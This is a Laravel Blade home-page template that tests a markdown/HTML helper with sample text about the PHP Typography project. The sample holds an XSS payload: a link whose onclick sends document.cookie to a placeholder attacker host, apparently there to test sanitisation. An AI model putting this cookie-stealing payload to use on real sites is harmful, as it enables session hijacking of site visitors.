@extends('layouts.master')

@section('content')
    <h1>Home page</h1>
    <p>Current time: {{ date('F j, Y, g:i A') }}  </p>

<h2>Testing Markdown</h2>
{{ Library\Html\Helpers::toHtml('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.

It was released in 2009, and helps improve web typography.

It "replaces characters" and adds wrapper spans for adjusting the appearance & style of a page.

<dl>
    <dt>Term</dt>
    <dd>Definition</dd>
</dl>') }}
@stop